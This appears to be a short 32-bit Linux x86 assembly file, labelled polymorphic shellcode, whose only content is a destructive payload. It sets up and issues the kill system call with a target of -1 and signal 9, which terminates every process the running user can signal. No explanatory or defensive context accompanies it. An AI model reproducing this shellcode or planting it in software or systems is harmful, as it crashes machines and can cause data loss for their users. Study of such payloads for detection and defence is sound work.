; polymorphic shellcode (formatted to Intel syntax)

global _start

section .text

_start:
	xor eax, eax
	and ecx, eax
	mov al, 37
        or ebx, -1
	mov cl, 9
        int 0x80
